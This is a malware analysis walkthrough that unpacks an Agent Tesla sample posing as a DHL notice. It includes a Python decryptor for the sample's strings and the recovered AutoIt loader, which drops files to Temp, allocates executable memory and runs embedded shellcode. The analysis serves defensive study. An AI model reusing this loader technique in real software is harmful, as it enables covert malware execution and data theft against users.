## Agent Tesla AutoIt Deobfuscation

Just a demo on how to unpack Agent Tesla AutoIt compiled executables.

SHA256: afec7242f5c41610ecb994d22fc8243a58866ed6c4c11a1544cca10019fe0a07

![image](https://github.com/jiayuchann/jiayuchann.github.io/assets/58498244/2414e7d0-34ff-4faf-9654-36835806c848)

`DHL Arrival Notice.exe` looks like a compiled AutoIt script, as Detect-It-Easy suggested and mentions of it in IDA.

![image](https://github.com/jiayuchann/jiayuchann.github.io/assets/58498244/818c3004-a1bf-41b7-9bf2-6ac2ec4b8e42)

![image](https://github.com/jiayuchann/jiayuchann.github.io/assets/58498244/0441a4af-9d33-4739-b074-52c1136c7520)

[Exe2Aut](https://exe2aut.com/exe2aut-converter/) is able to decompile this back into a .au3 file for easier analysis. But the script still looks highly obfuscated, with 2655 lines of code.

![image](https://github.com/jiayuchann/jiayuchann.github.io/assets/58498244/1a770cc7-636d-43fe-8019-457ef68f2c32)

Majority of the contents especially the for-loop construts in the middle are dummy code. 

We can see 2 embedded files `renowner` and `palladize` are extracted and moved into the user’s Temp directory. 

I opened them up in HXD, `palladize` looks weird, and `renowner` looks like encrypted.

There’s a few reference to the function `x30qqzpyj` which looks like it is being used for string decryption, since the return values are used as parameters to calls like `Execute`, `DllCall`, etc. 

![image](https://github.com/jiayuchann/jiayuchann.github.io/assets/58498244/33f46e0d-e2cd-42f0-8c78-59e795846bd1)

We can try to translate this function into Python, simulate and print out the results of the decryption for every call we see to it in the script:

```python
import re

def x30qqzpyj(p, b):
    d = len(b)
    v = len(p)
    k = [None] * v
    a = [None] * v
    m = ""

    for h in range(1, v + 1):
        k_index = (ord(b[(h - 1) % d]) * h % v)
        while k[k_index] is not None:
            k_index = (k_index + 1) % v
        k[k_index] = h - 1
    
    for h in range(1, v + 1):
        a[k[h - 1]] = p[h - 1]
    
    m = "".join(a)
    
    # XOR encryption
    j = ""
    for h in range(1, len(m) + 1):
        t = ord(m[h - 1])
        m_ord = ord(b[(h - 1) % d])
        j += chr((t - 5) ^ m_ord)
    
    return j

file_content = ""
with open("afec7242f5c41610ecb994d22fc8243a58866ed6c4c11a1544cca10019fe0a07.au3", "r") as file:
    file_content = file.read()

# Regex to find function calls
pattern = r"x30qqzpyj\((\".*?\"),\s*(\".*?\")\)"
matches = re.findall(pattern, file_content)

# Execute the function with the parameters found
for match in matches:
    param1 = match[0].strip("\"")  # Remove the double quotes if necessary
    param2 = match[1].strip("\"")
    result = x30qqzpyj(param1, param2)
print(f"Parameters: {param1}, {param2} -> Result: {result}")
```

![image](https://github.com/jiayuchann/jiayuchann.github.io/assets/58498244/fe861d58-bb1b-4f3a-a3d3-8c7efeaf7c68)

Sweet! Now we can plug them into the .au3 script.

```au3
FileInstall("renowner", @TempDir & "\renowner", 1)
FileInstall("palladize", @TempDir & "\palladize", 1)
Global $o30ytu4gil = Execute('FileRead(FileOpen(@TempDir  & "\palladize"))')
$o30ytu4gil = Execute('StringReplace($O30ytU4giL, "8D6804F867D7E3ED21599F86932DA5673082A29A59B06B261C54E6F1DF089BBB368C973697738FDC88", "")')
$l33eqfulh = DllCall("kernel32", "ptr", "VirtualAlloc", "dword", 0, "dword", BinaryLen($o30ytu4gil), "dword", 0x3000, "04"), "dword", 0x40)
$l33eqfulh = $l33eqfulh[0]
$b374rm9zkrm = DllStructCreate([ & BinaryLen($o30ytu4gil) & ], $l33eqfulh)
DllStructSetData($b374rm9zkrm, 1, $o30ytu4gil)
DllCallAddress("int", $l33eqfulh + 9136)
```

We can see that the beginning of the `palladize` file which starts with `8D6804F867D7E3ED21599F86932DA5673082A29A59B06B261C54E6F1DF089BBB368C973697738FDC88` is removed entirely. Then, a memory allocation with  `PAGE_EXECUTE_READWRITE` permissions, a structure created at the allocated memory address, storing the binary data of `$o30ytu4gil`. Then, it looks like it is calling a function at offset `9136` or `0x23B0`of the memory allocation, so `palladize` probably shellcode. 
Here's what `palladize` looks like with the bytes at the beginning removed:

![image](https://github.com/jiayuchann/jiayuchann.github.io/assets/58498244/298bbbac-29ab-4295-a4d6-85d952f60889)

Looks like the decoded text is still in hex representation. We can convert them into actual hex values first and then open it up in IDA. The entry point would be at offset `0x23B0`.

![image](https://github.com/jiayuchann/jiayuchann.github.io/assets/58498244/b6fe5545-8b25-4a61-bbe4-abc15bde457f)

Right away, there is a reference to the other file `renower`, which was dropped in the Temp directory. A constant that looks like a key is also copied into `v9`, and passed into `sub22E0`. `sub22E0` just looks like a simple XOR decryption loop. 

![image](https://github.com/jiayuchann/jiayuchann.github.io/assets/58498244/10a63792-7e4e-460d-a057-1bc5dd72b653)

There are a bunch of API resolving routines before this, but we can just assume that the file `renowner` can be decrypted with the key. Sure enough, it’s another MZ file! DIE recognized it as a .NET file.

![image](https://github.com/jiayuchann/jiayuchann.github.io/assets/58498244/f03979a2-89e8-42c4-96ea-748df8254cb0)

Saving the file and opening up in dnSpy, we can see the code for Agent Tesla, some keylogging capabilities:

![image](https://github.com/jiayuchann/jiayuchann.github.io/assets/58498244/7068ed61-f839-4661-b5b3-78c7e08bcf25)

And its config in the `Stu4Un2` class, where data is exfiltrated via SMTP.

![image](https://github.com/jiayuchann/jiayuchann.github.io/assets/58498244/a41bcec9-f3df-4cf3-92b4-ab18386d3b2a)
